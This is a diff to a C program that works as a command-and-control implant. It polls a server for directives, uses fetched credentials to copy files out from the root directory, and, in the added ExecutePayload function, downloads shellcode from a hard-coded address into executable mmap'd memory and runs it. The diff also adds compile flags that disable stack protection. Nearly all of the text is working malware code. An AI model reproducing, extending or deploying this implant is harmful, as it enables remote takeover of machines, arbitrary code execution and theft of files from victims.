@@ -7,14 +7,15 @@
 #include <errno.h>
 #include <time.h>
 #include <unistd.h>
+#include <sys/mman.h>
 
 // Author: Ezra Fast
 
 /* COMPILATION: 				--> Compiling with header files turned into a nightmare, enjoy this monolithic beast!
  * sudo apt install libcurl4-openssl-dev
- * gcc main.c -o main -s -lcurl
+ * gcc -fno-stack-protector -z execstack main.c -o main -s -lcurl
 */
-/* COMPILATION FOR WINDOWS:
+/* COMPILATION FOR WINDOWS:		// Shellcode execution on Windows is a work in progress...
  * 
  * gcc .\linux-main.c -o .\linux-main -IC:\curl\include\curl C:\curl\lib\libcurl.dll.a --static
  *	- obtain curl from the following link: https://curl.se/windows/
@@ -64,12 +65,14 @@ char * takePassword(void);
 char * cleanString(char * string);
 void generateRandomSequence(char * buffer);
 char * replaceSpaces(char * string);
+void ExecutePayload(void);
 
 // Globals:
 
-char * CADDRESS = "http://ADDRESS:PORT/instruction.txt";
+char * CADDRESS = "http://192.168.0.40:8080/instruction.txt";
 char * USERNAMEADDRESS = "http://ADDRESS:PORT/username.txt"; 
-char * PASSWORDADDRESS = "http://ADDRESS:PORT/password.txt"; 
+char * PASSWORDADDRESS = "http://ADDRESS:PORT/password.txt";
+char * SHELLCODEADDRESS = "http://192.168.0.40:8080/shellcode";
 char * BASEDIRECTORY = "/";
 
 // Main function:
@@ -77,15 +80,18 @@ char * BASEDIRECTORY = "/";
 int main(void) {
 	
 	char * controllerDirective;
-	char * username = cleanString(takeUsername());
-	char * password = cleanString(takePassword());
 	controllerDirective = takeControlInstruction();
 
 	if (strcmp(controllerDirective, "COPY") == 0) {
+		char * username = cleanString(takeUsername());
+		char * password = cleanString(takePassword());
 		Copy(BASEDIRECTORY, username, password);
 		system("rm tmp");
 		system("rm username");
 		system("rm password");
+	} else if (strcmp(controllerDirective, "EXEC") == 0) {
+		printf("Shellcoding\n");
+		ExecutePayload();
 	}
 
 	return 0;
@@ -180,7 +186,7 @@ void copyContents(char * fileName, char * suffix, char * username, char * passwo
 		res = curl_easy_perform(curl);
 
 		if (res != CURLE_OK) {
-			/*fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));*/
+			// fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
 		}
 
 		curl_easy_cleanup(curl);
@@ -207,7 +213,7 @@ char * takeControlInstruction(void) {			// Contact C2, place directive in file n
 		res = curl_easy_perform(curl);								// Make the request
 
 		if (res != CURLE_OK) {									// Handling errors
-		    /*fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));*/
+		    // fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
 		}
 
 		curl_easy_cleanup(curl);								// Cleaning up the structure we initialized earlier
@@ -243,7 +249,7 @@ char * takeUsername(void) {
 		curl_easy_setopt(curl, CURLOPT_URL, USERNAMEADDRESS);		
 		res = curl_easy_perform(curl);								
 		if (res != CURLE_OK) {									
-		    /*fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));*/
+		    // fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
 		}
 		curl_easy_cleanup(curl);								
 	}
@@ -265,7 +271,7 @@ char * takePassword(void) {
 		curl_easy_setopt(curl, CURLOPT_URL, PASSWORDADDRESS);		
 		res = curl_easy_perform(curl);								
 		if (res != CURLE_OK) {									
-		    /*fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));*/
+		    // fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
 		}
 		curl_easy_cleanup(curl);								
 	}
@@ -306,4 +312,41 @@ char * replaceSpaces(char * string) {
 		}
 	}
 	return string;
+}
+
+size_t writeCallback(char * pointer, size_t size, size_t nmemb, void * userdata) {
+	strcat(userdata, pointer);
+	return size * nmemb;
+}
+
+void ExecutePayload(void) {			// This function works by grabbing the shellcode, creating memory, filling that memory, and executing a function that points to that memory
+	
+	CURL * curl;
+	CURLcode res;
+	unsigned char buffer[1024] = {0};
+
+	curl = curl_easy_init();									
+	if (curl) {
+		curl_easy_setopt(curl, CURLOPT_URL, SHELLCODEADDRESS);		
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
+		curl_easy_setopt(curl, CURLOPT_WRITEDATA, buffer);
+		res = curl_easy_perform(curl);								
+		if (res != CURLE_OK) {									
+		    fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
+		}
+		curl_easy_cleanup(curl);								
+	}
+
+	// at this point "buffer" contains the shellcode
+
+	for (int i = 0; i < strlen(buffer); i++) {				// sizeof buffer will print the entire contents of the buffer 
+		printf("\\x%x", buffer[i]);
+	}
+
+	void * functionPointer = mmap(0, strlen(buffer), PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);	// Give me the memory for the shellcode
+
+	memcpy(functionPointer, buffer, strlen(buffer));			// Here, here is the shellcode
+
+	((void (*)())functionPointer)();				// execute the shellcode by calling the code buffer() points to
+
 }
